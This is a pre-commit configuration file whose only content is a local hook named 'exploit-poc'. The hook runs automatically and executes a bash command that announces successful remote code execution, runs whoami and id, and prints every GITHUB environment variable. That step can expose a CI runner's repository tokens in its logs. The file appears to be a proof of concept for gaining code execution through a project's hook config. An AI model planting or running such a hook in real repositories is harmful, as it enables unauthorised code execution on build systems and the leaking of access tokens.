repos:
- repo: local
  hooks:
    - id: exploit-poc
      name: exploit-poc
      entry: bash -c "echo '!!! RCE SUCCESSFUL !!!' && whoami && id && echo 'Token Permissions Check:' && env | grep GITHUB"
      language: system
      always_run: true
      pass_filenames: false
